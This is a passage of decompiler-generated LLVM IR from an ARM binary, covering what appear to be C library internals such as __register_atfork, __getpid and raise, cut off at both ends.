  %stack_var_-24 = alloca i32, align 4
  %v3_10c2c = load i32, i32* @r4, align 4
  store i32 %v3_10c2c, i32* %stack_var_-24, align 4
  store i32 14364, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r5.global-to-local, align 4
  %v0_10c3c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10c3c, i32* %r6.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14364), i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10c44

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10c78.dec_label_pc_10c44_crit_edge, %entry
  %v0_10c48 = phi i32 [ %v0_10c48.pre, %dec_label_pc_10c78.dec_label_pc_10c44_crit_edge ], [ %v0_10c3c, %entry ]
  %v1_10c44 = phi i32 [ %v1_10c44.pre, %dec_label_pc_10c78.dec_label_pc_10c44_crit_edge ], [ 14364, %entry ]
  %v0_10c44 = phi i32 [ %v0_10c44.pre, %dec_label_pc_10c78.dec_label_pc_10c44_crit_edge ], [ ptrtoint (i32* @global_var_23104.179 to i32), %entry ]
  %v2_10c44 = add i32 %v0_10c44, %v1_10c44
  %v3_10c44 = inttoptr i32 %v2_10c44 to i32*
  %v4_10c44 = load i32, i32* %v3_10c44, align 4
  store i32 %v4_10c44, i32* %r4.global-to-local, align 4
  %v2_10c4c = inttoptr i32 %v0_10c48 to i32*
  store i32 %v4_10c44, i32* %v2_10c4c, align 4
  %v0_10c50 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10c50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10c54

dec_label_pc_10c54:                               ; preds = %dec_label_pc_10c60.dec_label_pc_10c54_crit_edge, %dec_label_pc_10c44
  %v0_10c54 = phi i32 [ %v0_10c54.pre, %dec_label_pc_10c60.dec_label_pc_10c54_crit_edge ], [ %v0_10c50, %dec_label_pc_10c44 ]
  %v1_10c54 = inttoptr i32 %v0_10c54 to i32*
  %v2_10c54 = load i32, i32* %v1_10c54, align 4
  %v1_10c58 = load i32, i32* %r4.global-to-local, align 4
  %v3_10c58 = icmp uge i32 %v2_10c54, %v1_10c58
  store i1 %v3_10c58, i1* %cpsr_c.global-to-local, align 1
  %v9_10c58 = icmp eq i32 %v2_10c54, %v1_10c58
  br i1 %v9_10c58, label %dec_label_pc_10c60, label %dec_label_pc_10c78

dec_label_pc_10c60:                               ; preds = %dec_label_pc_10c54
  store i32 %v2_10c54, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10c70 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10c70, label %dec_label_pc_10c74, label %dec_label_pc_10c60.dec_label_pc_10c54_crit_edge

dec_label_pc_10c60.dec_label_pc_10c54_crit_edge:  ; preds = %dec_label_pc_10c60
  %v0_10c54.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10c54

dec_label_pc_10c74:                               ; preds = %dec_label_pc_10c60
  %v0_10c74 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10c78

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10c54, %dec_label_pc_10c74
  %v0_10c78 = phi i32 [ %v0_10c74, %dec_label_pc_10c74 ], [ %v2_10c54, %dec_label_pc_10c54 ]
  %v1_10c78 = phi i32 [ %v0_10c74, %dec_label_pc_10c74 ], [ %v1_10c58, %dec_label_pc_10c54 ]
  %v3_10c78 = icmp uge i32 %v0_10c78, %v1_10c78
  store i1 %v3_10c78, i1* %cpsr_c.global-to-local, align 1
  %v9_10c78 = icmp eq i32 %v0_10c78, %v1_10c78
  br i1 %v9_10c78, label %dec_label_pc_10c80, label %dec_label_pc_10c78.dec_label_pc_10c44_crit_edge

dec_label_pc_10c78.dec_label_pc_10c44_crit_edge:  ; preds = %dec_label_pc_10c78
  %v0_10c44.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_10c44.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10c48.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10c44

dec_label_pc_10c80:                               ; preds = %dec_label_pc_10c78
  %v2_10c80 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10c80, i32* %r4.global-to-local, align 4
  %v1_10c84 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_10c84

; uselistorder directives
  uselistorder i32 %v0_10c74, { 1, 0 }
  uselistorder i32 %v1_10c58, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14364), { 1, 0 }
  uselistorder i32 14364, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10c78, { 1, 0 }
}

define i32 @__GI___register_atfork(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_10c90 = load i32, i32* @r4, align 4
  %v12_10c90 = load i32, i32* @r7, align 4
  %v15_10c90 = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 10604), i32* @r5, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @fp, align 4
  %v0_10cb0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10cb0, i32* @r8, align 4
  store i32 %arg4, i32* @sl, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 10604), i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v2_10cc472 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 10604) to i32*), align 4
  store i32 %v2_10cc472, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_10cc874 = icmp eq i32 %v2_10cc472, 0
  br i1 %v9_10cc874, label %dec_label_pc_10cd0, label %dec_label_pc_10ce8

dec_label_pc_10cd0:                               ; preds = %entry, %dec_label_pc_10cd0.dec_label_pc_10cc4_crit_edge
  %v0_10cd075 = phi i32 [ %v1_10cc8.pre, %dec_label_pc_10cd0.dec_label_pc_10cc4_crit_edge ], [ 0, %entry ]
  store i32 %v0_10cd075, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10ce0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10ce0, label %dec_label_pc_10ce4, label %dec_label_pc_10cd0.dec_label_pc_10cc4_crit_edge

dec_label_pc_10cd0.dec_label_pc_10cc4_crit_edge:  ; preds = %dec_label_pc_10cd0
  %v0_10cc4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10cc8.pre = load i32, i32* @r4, align 4
  %v1_10cc4 = inttoptr i32 %v0_10cc4.pre to i32*
  %v2_10cc4 = load i32, i32* %v1_10cc4, align 4
  store i32 %v2_10cc4, i32* %r3.global-to-local, align 4
  %v3_10cc8 = icmp uge i32 %v2_10cc4, %v1_10cc8.pre
  store i1 %v3_10cc8, i1* %cpsr_c.global-to-local, align 1
  %v9_10cc8 = icmp eq i32 %v2_10cc4, %v1_10cc8.pre
  br i1 %v9_10cc8, label %dec_label_pc_10cd0, label %dec_label_pc_10ce8

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10cd0
  %v0_10ce4 = load i32, i32* @r4, align 4
  store i32 %v0_10ce4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10ce8

dec_label_pc_10ce8:                               ; preds = %entry, %dec_label_pc_10cd0.dec_label_pc_10cc4_crit_edge, %dec_label_pc_10ce4
  %v0_10ce8 = phi i32 [ %v0_10ce4, %dec_label_pc_10ce4 ], [ %v2_10cc472, %entry ], [ %v2_10cc4, %dec_label_pc_10cd0.dec_label_pc_10cc4_crit_edge ]
  %v1_10ce8 = phi i32 [ %v0_10ce4, %dec_label_pc_10ce4 ], [ 0, %entry ], [ %v1_10cc8.pre, %dec_label_pc_10cd0.dec_label_pc_10cc4_crit_edge ]
  %v3_10ce8 = icmp uge i32 %v0_10ce8, %v1_10ce8
  store i1 %v3_10ce8, i1* %cpsr_c.global-to-local, align 1
  %v9_10ce8 = icmp eq i32 %v0_10ce8, %v1_10ce8
  br i1 %v9_10ce8, label %bb48, label %bb

bb:                                               ; preds = %dec_label_pc_10ce8
  %v1_10cec = load i32, i32* @r5, align 4
  store i32 %v1_10cec, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_10ce8, %bb
  store i32 68852, i32* @lr, align 4
  %v1_10cf0 = xor i1 %v9_10ce8, true
  call void @__pseudo_cond_branch(i1 %v1_10cf0, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  store i32 10608, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r1.global-to-local, align 4
  %v0_10cfc = load i32, i32* @r6, align 4
  %v2_10cfc = add i32 %v0_10cfc, 10608
  %v0_10d00.pre = load i32, i32* @r4, align 4
  %tmp49 = icmp ult i32 %v0_10d00.pre, 48
  br label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %dec_label_pc_10d24, %bb48
  %v0_10d24 = phi i32 [ %v2_10d24, %dec_label_pc_10d24 ], [ %v2_10cfc, %bb48 ]
  store i32 %v0_10d00.pre, i32* %r2.global-to-local, align 4
  br i1 %tmp49, label %dec_label_pc_10d08, label %dec_label_pc_10d24

dec_label_pc_10d08:                               ; preds = %dec_label_pc_10d00, %dec_label_pc_10d18
  %v0_10d18 = phi i32 [ %v1_10d18, %dec_label_pc_10d18 ], [ %v0_10d00.pre, %dec_label_pc_10d00 ]
  %v3_10d08 = mul i32 %v0_10d18, 28
  %v4_10d08 = add i32 %v3_10d08, %v0_10d24
  store i32 %v4_10d08, i32* %r3.global-to-local, align 4
  %v1_10d0c = add i32 %v4_10d08, 24
  %v2_10d0c = inttoptr i32 %v1_10d0c to i32*
  %v3_10d0c = load i32, i32* %v2_10d0c, align 4
  store i32 %v3_10d0c, i32* %r3.global-to-local, align 4
  %v2_10d10 = icmp eq i32 %v3_10d0c, 0
  br i1 %v2_10d10, label %dec_label_pc_10d60.loopexit, label %dec_label_pc_10d18

dec_label_pc_10d18:                               ; preds = %dec_label_pc_10d08
  %v1_10d18 = add nuw nsw i32 %v0_10d18, 1
  store i32 %v1_10d18, i32* %r2.global-to-local, align 4
  %tmp50 = icmp ult i32 %v1_10d18, 48
  br i1 %tmp50, label %dec_label_pc_10d08, label %dec_label_pc_10d24

dec_label_pc_10d24:                               ; preds = %dec_label_pc_10d18, %dec_label_pc_10d00
  %v1_10d24 = inttoptr i32 %v0_10d24 to i32*
  %v2_10d24 = load i32, i32* %v1_10d24, align 4
  store i32 %v2_10d24, i32* @r7, align 4
  %v2_10d28 = icmp eq i32 %v2_10d24, 0
  br i1 %v2_10d28, label %dec_label_pc_10d30, label %dec_label_pc_10d00

dec_label_pc_10d30:                               ; preds = %dec_label_pc_10d24
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1348, i32* %r1.global-to-local, align 4
  %v2_10d38 = call i32 @calloc(i32 1, i32 1348)
  store i32 %v2_10d38, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d3c = icmp eq i32 %v2_10d38, 0
  br i1 %v2_10d3c, label %bb51, label %dec_label_pc_10d48

bb51:                                             ; preds = %dec_label_pc_10d30
  %v1_10d40 = load i32, i32* @r7, align 4
  store i32 %v1_10d40, i32* @r5, align 4
  br label %dec_label_pc_10d90

dec_label_pc_10d48:                               ; preds = %dec_label_pc_10d30
  store i32 10608, i32* %r2.global-to-local, align 4
  %v0_10d4c = load i32, i32* @r6, align 4
  %v2_10d4c = add i32 %v0_10d4c, 10608
  %v3_10d4c = inttoptr i32 %v2_10d4c to i32*
  %v4_10d4c = load i32, i32* %v3_10d4c, align 4
  store i32 %v4_10d4c, i32* %r3.global-to-local, align 4
  store i32 %v2_10d38, i32* @r7, align 4
  %v2_10d54 = inttoptr i32 %v2_10d38 to i32*
  store i32 %v4_10d4c, i32* %v2_10d54, align 4
  %v0_10d58 = load i32, i32* %r0.global-to-local, align 4
  %v1_10d58 = load i32, i32* @r6, align 4
  %v2_10d58 = load i32, i32* %r2.global-to-local, align 4
  %v3_10d58 = add i32 %v2_10d58, %v1_10d58
  %v4_10d58 = inttoptr i32 %v3_10d58 to i32*
  store i32 %v0_10d58, i32* %v4_10d58, align 4
  store i32 47, i32* %r2.global-to-local, align 4
  %v2_10d64.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10d60

dec_label_pc_10d60.loopexit:                      ; preds = %dec_label_pc_10d08
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_10d60

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d60.loopexit, %dec_label_pc_10d48
  %v2_10d64 = phi i32 [ %v0_10d24, %dec_label_pc_10d60.loopexit ], [ %v2_10d64.pre, %dec_label_pc_10d48 ]
  %v0_10d64 = phi i32 [ %v0_10d18, %dec_label_pc_10d60.loopexit ], [ 47, %dec_label_pc_10d48 ]
  %v3_10d64 = mul i32 %v0_10d64, 28
  %v4_10d64 = add i32 %v3_10d64, %v2_10d64
  store i32 %v4_10d64, i32* %r3.global-to-local, align 4
  %v2_10d6c = add i32 %v4_10d64, 24
  %v3_10d6c = inttoptr i32 %v2_10d6c to i32*
  store i32 1, i32* %v3_10d6c, align 4
  %v0_10d70 = load i32, i32* %r3.global-to-local, align 4
  %v1_10d70 = add i32 %v0_10d70, 4
  store i32 %v1_10d70, i32* @r5, align 4
  %v2_10d70 = icmp ugt i32 %v0_10d70, -5
  store i1 %v2_10d70, i1* %cpsr_c.global-to-local, align 1
  %v7_10d70 = icmp eq i32 %v1_10d70, 0
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10d78 = add i32 %v0_10d70, 28
  %v3_10d78 = inttoptr i32 %v2_10d78 to i32*
  store i32 0, i32* %v3_10d78, align 4
  br i1 %v7_10d70, label %dec_label_pc_10d90, label %dec_label_pc_10d80

dec_label_pc_10d80:                               ; preds = %dec_label_pc_10d60
  %v0_10d80 = load i32, i32* @r5, align 4
  %v1_10d80 = add i32 %v0_10d80, 4
  %v2_10d80 = inttoptr i32 %v1_10d80 to i32*
  %v3_10d80 = load i32, i32* @r8, align 4
  store i32 %v3_10d80, i32* %v2_10d80, align 4
  %v4_10d80 = add i32 %v0_10d80, 8
  %v5_10d80 = inttoptr i32 %v4_10d80 to i32*
  %v6_10d80 = load i32, i32* @sb, align 4
  store i32 %v6_10d80, i32* %v5_10d80, align 4
  %v7_10d80 = add i32 %v0_10d80, 12
  %v8_10d80 = inttoptr i32 %v7_10d80 to i32*
  %v9_10d80 = load i32, i32* @fp, align 4
  store i32 %v9_10d80, i32* %v8_10d80, align 4
  %v0_10d84 = load i32, i32* @sl, align 4
  %v1_10d84 = load i32, i32* @r5, align 4
  %v2_10d84 = add i32 %v1_10d84, 16
  %v3_10d84 = inttoptr i32 %v2_10d84 to i32*
  store i32 %v0_10d84, i32* %v3_10d84, align 4
  %v0_10d88 = load i32, i32* @r5, align 4
  store i32 %v0_10d88, i32* %r0.global-to-local, align 4
  %v1_10d8c = inttoptr i32 %v0_10d88 to i32*
  %v2_10d8c = call i32 @__linkin_atfork(i32* %v1_10d8c)
  store i32 %v2_10d8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d90

dec_label_pc_10d90:                               ; preds = %bb51, %dec_label_pc_10d60, %dec_label_pc_10d80
  store i32 10604, i32* %r7.global-to-local, align 4
  %v0_10d94 = load i32, i32* @r6, align 4
  %v2_10d94 = add i32 %v0_10d94, 10604
  store i32 %v2_10d94, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10d98

dec_label_pc_10d98:                               ; preds = %dec_label_pc_10dc8.dec_label_pc_10d98_crit_edge, %dec_label_pc_10d90
  %v0_10da0 = phi i32 [ %v0_10da0.pre, %dec_label_pc_10dc8.dec_label_pc_10d98_crit_edge ], [ %v2_10d94, %dec_label_pc_10d90 ]
  %v1_10d98 = phi i32 [ %v1_10d98.pre, %dec_label_pc_10dc8.dec_label_pc_10d98_crit_edge ], [ 10604, %dec_label_pc_10d90 ]
  %v0_10d98 = phi i32 [ %v0_10d98.pre, %dec_label_pc_10dc8.dec_label_pc_10d98_crit_edge ], [ %v0_10d94, %dec_label_pc_10d90 ]
  %v2_10d98 = add i32 %v0_10d98, %v1_10d98
  %v3_10d98 = inttoptr i32 %v2_10d98 to i32*
  %v4_10d98 = load i32, i32* %v3_10d98, align 4
  store i32 %v4_10d98, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_10da0, i32* %r2.global-to-local, align 4
  %v1_10da460 = inttoptr i32 %v0_10da0 to i32*
  %v2_10da461 = load i32, i32* %v1_10da460, align 4
  store i32 %v2_10da461, i32* %r3.global-to-local, align 4
  %v3_10da863 = icmp uge i32 %v2_10da461, %v4_10d98
  store i1 %v3_10da863, i1* %cpsr_c.global-to-local, align 1
  %v9_10da869 = icmp eq i32 %v2_10da461, %v4_10d98
  br i1 %v9_10da869, label %dec_label_pc_10db0, label %dec_label_pc_10dc8

dec_label_pc_10db0:                               ; preds = %dec_label_pc_10d98, %dec_label_pc_10db0.dec_label_pc_10da4_crit_edge
  %v0_10db070 = phi i32 [ %v1_10da8.pre, %dec_label_pc_10db0.dec_label_pc_10da4_crit_edge ], [ %v4_10d98, %dec_label_pc_10d98 ]
  store i32 %v0_10db070, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10dc0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10dc0, label %dec_label_pc_10dc4, label %dec_label_pc_10db0.dec_label_pc_10da4_crit_edge

dec_label_pc_10db0.dec_label_pc_10da4_crit_edge:  ; preds = %dec_label_pc_10db0
  %v0_10da4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10da8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10da4 = inttoptr i32 %v0_10da4.pre to i32*
  %v2_10da4 = load i32, i32* %v1_10da4, align 4
  store i32 %v2_10da4, i32* %r3.global-to-local, align 4
  %v3_10da8 = icmp uge i32 %v2_10da4, %v1_10da8.pre
  store i1 %v3_10da8, i1* %cpsr_c.global-to-local, align 1
  %v9_10da8 = icmp eq i32 %v2_10da4, %v1_10da8.pre
  br i1 %v9_10da8, label %dec_label_pc_10db0, label %dec_label_pc_10dc8

dec_label_pc_10dc4:                               ; preds = %dec_label_pc_10db0
  %v0_10dc4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10dc4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10dc8

dec_label_pc_10dc8:                               ; preds = %dec_label_pc_10d98, %dec_label_pc_10db0.dec_label_pc_10da4_crit_edge, %dec_label_pc_10dc4
  %v0_10dd0 = phi i32 [ %v0_10dc4, %dec_label_pc_10dc4 ], [ %v2_10da461, %dec_label_pc_10d98 ], [ %v2_10da4, %dec_label_pc_10db0.dec_label_pc_10da4_crit_edge ]
  %v1_10dc8 = phi i32 [ %v0_10dc4, %dec_label_pc_10dc4 ], [ %v4_10d98, %dec_label_pc_10d98 ], [ %v1_10da8.pre, %dec_label_pc_10db0.dec_label_pc_10da4_crit_edge ]
  %v3_10dc8 = icmp uge i32 %v0_10dd0, %v1_10dc8
  store i1 %v3_10dc8, i1* %cpsr_c.global-to-local, align 1
  %v9_10dc8 = icmp eq i32 %v0_10dd0, %v1_10dc8
  br i1 %v9_10dc8, label %dec_label_pc_10dd0, label %dec_label_pc_10dc8.dec_label_pc_10d98_crit_edge

dec_label_pc_10dc8.dec_label_pc_10d98_crit_edge:  ; preds = %dec_label_pc_10dc8
  %v0_10d98.pre = load i32, i32* @r6, align 4
  %v1_10d98.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10da0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10d98

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10dc8
  %v2_10dd0 = icmp ne i32 %v1_10dc8, 0
  store i1 %v2_10dd0, i1* %cpsr_c.global-to-local, align 1
  %v7_10dd4 = icmp slt i32 %v1_10dc8, 2
  br i1 %v7_10dd4, label %dec_label_pc_10df0, label %dec_label_pc_10dd8

dec_label_pc_10dd8:                               ; preds = %dec_label_pc_10dd0
  %v0_10dd8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10dd8, i32* %r0.global-to-local, align 4
  %v0_10ddc = load i32, i32* %r1.global-to-local, align 4
  %v1_10ddc = add i32 %v0_10ddc, 129
  store i32 %v1_10ddc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10df0

dec_label_pc_10df0:                               ; preds = %dec_label_pc_10dd8, %dec_label_pc_10dd0
  %v0_10df0 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10df0 = icmp eq i32 %v0_10df0, 0
  %. = select i1 %v2_10df0, i32 12, i32 0
  store i32 %., i32* %r0.global-to-local, align 4
  store i32 %v3_10c90, i32* %r4.global-to-local, align 4
  store i32 %v12_10c90, i32* %r7.global-to-local, align 4
  store i32 %v15_10c90, i32* %r8.global-to-local, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v0_10dc4, { 1, 0, 2 }
  uselistorder i32 %v1_10da8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10d38, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10d24, { 1, 2, 0 }
  uselistorder i32 %v1_10d18, { 1, 2, 0 }
  uselistorder i32 %v0_10d18, { 0, 2, 1 }
  uselistorder i32 %v0_10d24, { 0, 2, 1 }
  uselistorder i32 %v0_10d00.pre, { 0, 2, 1 }
  uselistorder i32 %v0_10ce4, { 1, 0, 2 }
  uselistorder i32 %v1_10cc8.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 15, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 2, 3, 5, 4, 9, 10, 6, 7, 8, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 6, 5, 0, 7, 12, 8, 13, 9, 11, 10, 1 }
  uselistorder i32 10608, { 0, 2, 1, 3 }
  uselistorder i32 10604, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10dc8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10db0, { 1, 0 }
  uselistorder label %dec_label_pc_10d90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10d08, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_10ce8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10cd0, { 1, 0 }
}

define i32 @function_10e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10e0c:
  %v0_10e0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10e0c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10e0c
  %v2_10e14 = load i32, i32* @r4, align 4
  %v5_10e14 = sdiv i32 %v2_10e14, 1024
  %v6_10e14 = and i32 %v5_10e14, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10e0c, %bb
  %v7_10e14 = phi i32 [ %arg1, %dec_label_pc_10e0c ], [ %v6_10e14, %bb ]
  ret i32 %v7_10e14

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__getpid() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10e18 = load i32, i32* @r7, align 4
  store i32 %v3_10e18, i32* %stack_var_-8, align 4
  %v0_10e1c = call i32 @__aeabi_read_tp()
  store i32 %v0_10e1c, i32* %r0.global-to-local, align 4
  %v1_10e20 = add i32 %v0_10e1c, -1060
  %v2_10e20 = inttoptr i32 %v1_10e20 to i32*
  %v3_10e20 = load i32, i32* %v2_10e20, align 4
  %tmp7 = icmp slt i32 %v3_10e20, 1
  br i1 %tmp7, label %dec_label_pc_10e30, label %dec_label_pc_10e54

dec_label_pc_10e30:                               ; preds = %entry
  %v2_10e24 = icmp eq i32 %v3_10e20, 0
  br i1 %v2_10e24, label %dec_label_pc_10e34, label %dec_label_pc_10e40

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10e30
  %v1_10e34 = add i32 %v0_10e1c, -1064
  %v2_10e34 = inttoptr i32 %v1_10e34 to i32*
  %v3_10e34 = load i32, i32* %v2_10e34, align 4
  store i32 %v3_10e34, i32* %r0.global-to-local, align 4
  %v2_10e38 = icmp eq i32 %v3_10e34, 0
  br i1 %v2_10e38, label %bb, label %bb8

dec_label_pc_10e40:                               ; preds = %dec_label_pc_10e30
  br label %bb8

bb:                                               ; preds = %dec_label_pc_10e34
  store i32 0, i32* %v2_10e34, align 4
  %v0_10e50.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_10e40, %dec_label_pc_10e34, %bb
  %v0_10e50 = phi i32 [ %v3_10e34, %dec_label_pc_10e34 ], [ %v0_10e1c, %dec_label_pc_10e40 ], [ %v0_10e50.pre, %bb ]
  br label %dec_label_pc_10e54

dec_label_pc_10e54:                               ; preds = %entry, %bb8
  %v0_10e54 = phi i32 [ %v3_10e20, %entry ], [ %v0_10e50, %bb8 ]
  store i32 %v0_10e54, i32* %r0.global-to-local, align 4
  %v2_10e58 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10e58, i32* @r7, align 4
  ret i32 %v0_10e54

; uselistorder directives
  uselistorder i32 %v0_10e54, { 1, 0 }
  uselistorder i32 %v3_10e20, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10e54, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10e60 = load i32, i32* @r4, align 4
  store i32 %v3_10e60, i32* %stack_var_-20, align 4
  %v0_10e68 = call i32 @__aeabi_read_tp()
  store i32 %v0_10e68, i32* %r0.global-to-local, align 4
  %v1_10e6c = add i32 %v0_10e68, -1064
  %v2_10e6c = inttoptr i32 %v1_10e6c to i32*
  %v3_10e6c = load i32, i32* %v2_10e6c, align 4
  store i32 %v3_10e6c, i32* %r4.global-to-local, align 4
  %v2_10e70 = icmp eq i32 %v3_10e6c, 0
  %v1_10e78 = add i32 %v0_10e68, -1060
  %v2_10e78 = inttoptr i32 %v1_10e78 to i32*
  %v3_10e78 = load i32, i32* %v2_10e78, align 4
  store i32 %v3_10e78, i32* %r0.global-to-local, align 4
  br i1 %v2_10e70, label %dec_label_pc_10e80, label %dec_label_pc_10e94

dec_label_pc_10e80:                               ; preds = %entry
  store i32 %v3_10e78, i32* %r4.global-to-local, align 4
  store i32 %v3_10e78, i32* %v2_10e6c, align 4
  %v0_10ebc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_10e94:                               ; preds = %entry
  %v5_10e98 = icmp sgt i32 %v3_10e78, 0
  br i1 %v5_10e98, label %bb28, label %dec_label_pc_10e9c

dec_label_pc_10e9c:                               ; preds = %dec_label_pc_10e94
  %tmp = bitcast i32 %v3_10e78 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_10e9c = bitcast float %tmp30 to i32
  %v2_10ea0 = icmp eq i32 %v1_10e9c, 0
  br i1 %v2_10ea0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10e9c
  store i32 %v3_10e6c, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_10e9c
  %v2_10ea8 = sub i32 0, %v3_10e78
  store i32 %v2_10ea8, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_10e94, %dec_label_pc_10e80, %.thread
  %v0_10ec0 = phi i32 [ %v3_10e78, %dec_label_pc_10e94 ], [ %v0_10ebc.pre, %dec_label_pc_10e80 ], [ %v3_10e6c, %bb ], [ %v2_10ea8, %.thread ]
  store i32 %v0_10ec0, i32* %r2.global-to-local, align 4
